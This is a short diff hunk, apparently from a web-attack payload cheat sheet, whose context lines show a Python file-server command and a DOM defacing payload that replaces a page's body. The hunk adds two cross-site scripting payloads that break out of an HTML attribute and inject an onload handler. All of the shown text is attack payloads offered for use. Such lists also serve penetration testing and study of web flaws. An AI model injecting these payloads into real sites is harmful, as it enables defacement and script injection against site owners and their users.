@@ -6050,6 +6050,11 @@ sudo python -m SimpleHTTPServer 80
 
 # DOM manipulation / defacing payload
 document.body.innerHTML="some_defacing_here";
+
+# action-based / DOM events
+"><body onload="alert(1)">
+" onload="javascript:alert(1)
+
 ```
 
 
